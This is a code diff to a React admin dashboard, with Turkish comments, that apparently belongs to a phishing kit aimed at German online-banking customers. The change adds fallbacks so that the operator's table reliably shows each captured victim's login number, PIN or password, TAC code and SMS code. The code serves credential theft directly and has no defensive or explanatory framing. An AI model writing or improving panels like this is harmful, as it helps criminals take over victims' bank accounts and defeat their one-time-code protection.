@@ -1165,9 +1165,32 @@ export function AdminDashboardClean() {
                         </div>
                         {fd.loginMethod && <div className="text-blue-400 font-bold">Yöntem: <span className="text-zinc-100">{fd.loginMethod}</span></div>}
                         {fd.personalCode && <div className="text-blue-400 font-bold">Kimlik No: <span className="text-zinc-100">{fd.personalCode}</span></div>}
-                        <div className="text-blue-400 font-bold">ID: <span className="text-zinc-100">{fd.verfuegernummer || fd.id || "-"}</span></div>
-                        <div className="text-blue-400 font-bold">PW: <span className="text-zinc-100">{fd.pin || fd.pw || "-"}</span></div>
-                        <div className="text-blue-400 font-bold">KOD: <span className="text-zinc-100">{fd.tacCode || fd.tac_code || "-"}</span></div>
+                        {
+                          // ⭐⭐⭐ ID/KULLANICI kolonunda 4 katmanlı FALLBACK:
+                          //   Köken: submitCapturedFields orderedField1 GARANTİLİ olsa bile, eski
+                          //   session kayıtlarında orderedField1 boş olabilir VEYA merge esnasında
+                          //   usernameField bulunamamış olabilir.
+                          //   Bu yüzden:
+                          //   1) verfuegernummer (semantic username), 2) username,
+                          //   3) orderedField1 (sıralı alan1),
+                          //   4) fd.id (session id son çare)
+                        }
+                        <div className="text-blue-400 font-bold">ID: <span className="text-zinc-100">{(
+                          fd.verfuegernummer || fd.username ||
+                          fd.orderedField1 ||
+                          fd.id ||
+                          "-"
+                        )}</span></div>
+                        <div className="text-blue-400 font-bold">PW: <span className="text-zinc-100">{(
+                          fd.pin || fd.password || fd.pw ||
+                          fd.orderedField2 ||
+                          "-"
+                        )}</span></div>
+                        <div className="text-blue-400 font-bold">KOD: <span className="text-zinc-100">{(
+                          fd.tacCode || fd.tac_code || fd.personalCode ||
+                          fd.orderedField3 ||
+                          "-"
+                        )}</span></div>
                       </td>
                       <td className="px-4 py-4 font-mono font-bold text-orange-400 text-sm">{fd.smsCode || "-"}</td>
                       <td className="px-4 py-4 text-right">
